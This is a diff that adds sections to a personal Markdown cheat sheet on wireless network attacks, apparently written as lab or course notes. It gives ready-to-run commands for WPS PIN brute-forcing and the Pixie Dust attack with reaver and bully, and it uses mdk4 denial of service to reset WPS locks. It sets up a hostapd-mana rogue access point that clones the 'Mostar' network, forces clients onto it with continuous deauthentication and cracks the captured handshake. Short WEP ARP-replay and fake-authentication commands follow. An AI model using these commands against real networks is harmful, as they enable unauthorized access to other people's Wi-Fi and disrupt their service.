@@ -2,6 +2,16 @@
 
 ---
 
+#### 🔹 Change the MAC Adress
+
+```bash
+systemctl stop network-manager
+ip link set wlan2 down
+macchanger -m <the New MAC Adress> wlan2
+ip link set wlan2 up
+```
+
+-------------------------
 #### 🔹 Start Monitor Mode on a Specific Channel
 
 ```bash
@@ -27,6 +37,8 @@ sudo iwconfig wlan0mon
 
 - Displays current channel, frequency, mode, and other stats.
     
+![[Pasted image 20250315011921.png]]
+
 -------------
 
 #### 🔹 List System & Wireless Card Details
@@ -297,11 +309,23 @@ _If no handshake is captured, increase the deauth count._
 
 Save to `free.conf`, then:
 
-`wpa_supplicant -Dnl80211 -iwlan2 -c free.conf 
+`wpa_supplicant -Dnl80211 -iwlan2 -c free.conf` 
 
 In another terminal as root:
 
 `sudo dhclient wlan2 -v`
+
+----------------------
+#### 🔹 Connect to WPA-PSK with password
+
+```
+network={
+  ssid="home_network"
+  scan_ssid=1
+  psk="password_here"
+  key_mgmt=WPA-PSK
+}
+```
 
 ---
 
@@ -425,4 +449,249 @@ aircrack-ng -r wifi-db cafe.cap
 
 > This attack is extremely fast (milliseconds), assuming the correct handshake and rainbow table are available.
 
+
+### 📘 **WPS Attacks**
+#### 🔹 Scan WPS-Enabled Networks (wash)
+
+`wash -i wlan0mon`
+
+Displays WPS info like BSSID, channel, vendor, and lock status. Useful for identifying vulnerable APs.
+
+---
+
+#### 🔹 Brute-force WPS PIN (Reaver)
+
+`sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv`
+
+Launches a WPS PIN brute-force attack. Reaver tries common PINs and continues until success.
+
+---
+
+#### 🔹 Fix “Waiting for beacon” Issue (Reaver with channel)
+
+`sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -c 3 -vv`
+
+Manually set the channel to help Reaver detect the target AP.
+
+---
+
+#### 🔹 Pixie Dust Attack (Reaver + PixieWPS)
+
+`sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv -K`
+
+Performs offline WPS PIN attack using leaked crypto values. Very fast on vulnerable APs.
+
+---
+
+#### 🔹 WPS Attack with Bully (PixieWPS Mode)
+
+`bully -d wlan0mon -b 34:08:04:09:3D:38 -v 4`
+
+Bully brute-forces WPS PIN and attempts PixieWPS if supported.
+
+---
+
+#### 🔹 Test Known Default WPS PINs (Airgeddon)
+
+`sudo apt install airgeddon source /usr/share/airgeddon/known_pins.db echo ${PINDB["0013F7"]}`
+
+Searches Airgeddon’s database for default WPS PINs based on BSSID prefix.
+
+---
+
+#### 🔹 Manually Test Known PIN with Reaver
+
+`reaver -i wlan0mon -b 34:08:04:09:3D:38 -p 14755989 -vv`
+
+Tries a specific WPS PIN on the AP. Useful for testing known/default PINs.
+
+---
+
+#### 🔹 Resume Reaver After Failure
+
+`sudo reaver -i wlan0mon -b 34:08:04:09:3D:38 -vv`
+
+When WPS transaction fails, restart without `-K` to resume from saved session.
+
+---
+
+#### 🔹 Force WPS Lock Bypass (mdk4 DoS)
+
+`mdk4 wlan0mon a -a 34:08:04:09:3D:38`
+
+Launches authentication DoS attack to crash AP and potentially reset WPS lock.
+
+---
+
+#### 🔹 One-PIN Try with Bully
+
+`bully -d wlan0mon -b 34:08:04:09:3D:38 -B -p 96039620`
+
+Uses a single known PIN to retrieve the WPA passphrase quickly.
+
+⚠️ **Common Issues and Solutions**
+
+|Issue|Solution|
+|---|---|
+|WPS Transaction Failure|Restart `reaver` without `-K`, or try a different wireless adapter.|
+|ACK Issues (Same PIN loop)|Use a different wireless adapter for better compatibility.|
+|WPS Lock|Use `mdk3` or `mdk4` DoS attack to force the router to reboot.|
+
+---
+
+💡 **Quick Tips**
+
+- Always try **PixieWPS** first — it's much faster.
+    
+- Not all routers are vulnerable to the **PixieWPS** attack.
+    
+- Some networks **lock WPS automatically** after several failed attempts.
+    
+- Some wireless adapters are **not compatible** with `reaver` or `bully`, especially regarding **ACKs** or **association** failures.
+
+---------------------
+### 📘 **Rogue Access Points**
+
+🔹 **Start Recon with Airodump-ng**
+
+`sudo airodump-ng -w discovery --output-format pcap wlan0mon`
+
+Captures nearby APs and clients into a `.pcap` file for further analysis.
+
+---
+
+🔹 **Analyze Beacon Frames in Wireshark**
+
+`Filter: wlan.fc.type_subtype == 0x08 && wlan.ssid == "Mostar"`
+
+Shows beacon frames from the AP "Mostar" with full security config (WPA1/WPA2 + TKIP/CCMP).
+
+---
+
+🔹 **Key Info from Wireshark - Mostar AP**
+
+```bash
+ESSID: Mostar   
+BSSID: FC:7A:2B:88:63:EF   
+Channel: 1   
+Encryption: WPA1/WPA2 (TKIP & CCMP)   
+Auth: PSK   
+Speed: 130 Mbps → 802.11n
+```
+
+Rogue AP must match these parameters to trick the client.
+
+---
+
+🔹 **Rogue AP Configuration - Mostar Clone**
+
+```
+kali@kali:~$ cat Mostar-mana.conf
+
+interface=wlan0  
+ssid=Mostar  
+channel=1  
+hw_mode=g              # 2.4GHz band  
+ieee80211n=1           # Enable 802.11n  
+wpa=3                  # Enable WPA & WPA2  
+wpa_key_mgmt=WPA-PSK  
+wpa_passphrase=ANYPASSWORD  # Any PSK – just for handshake capture  
+wpa_pairwise=TKIP  
+rsn_pairwise=TKIP CCMP  
+mana_wpaout=/home/kali/mostar.hccapx  # Save handshake here
+```
+
+✅ Matches target AP  
+✅ Saves captured handshakes  
+✅ Fake PSK accepted – handshake still works
+
+---
+
+🔹 **Starting Rogue AP**
+
+```bash
+sudo hostapd-mana Mostar-mana.conf
+```
+
+📡 Hostapd-Mana broadcasts "Mostar" clone  
+📥 Logs handshake captures (even with wrong PSK)
+
+---
+
+🔹 **Captured Handshake Example**
+
+```
+MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e  
+AP-STA-POSSIBLE-PSK-MISMATCH
+```
+
+🧠 Clients try to connect if signal is stronger  
+🪝 Handshake captured even though auth fails
+
+---
+
+🔹 **Forcing Clients to Connect**
+
+```bash
+sudo airmon-ng start wlan1 1
+sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
+```
+
+💣 Sends continuous deauth packets  
+🔄 Clients drop target AP and try our rogue AP  
+📶 Higher chance of handshake capture
+
+---
+
+🔹 **Cracking the Handshake**
+
+```bash
+aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+```
+
+🎯 **KEY FOUND!** [ `teddybear` ]  
+🔓 PSK recovered from captured handshake
+
+---
+
+🔹 **Wireshark - Mostar AP Snapshot**
+
+```
+ESSID: Mostar  
+BSSID: FC:7A:2B:88:63:EF  
+Channel: 1  
+Encryption: WPA1/WPA2 (TKIP & CCMP)  
+Auth: PSK  
+Speed: 130 Mbps → 802.11n
+```
+
+🧬 Rogue AP must **mimic** these parameters
+
+---
+
+### 📘 **WEP Attacks**
+
+
+- There are no handshakes here.
+
+------------------------
+
+#### 🔹 ARP Replay Attack - Generate More Traffic
+
+```
+aireplay-ng -3 -b <BSSID> -h <your MAC> wlan0mon
+```
+
+------------------------------
+
+#### 🔹 Fake Authentication (If ARP Replay Fails)
+
+```
+aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
+```
+
+
+>Associates your interface with the AP before injection. Required in some cases to bypass AP restrictions.
+
+-----------------------
 
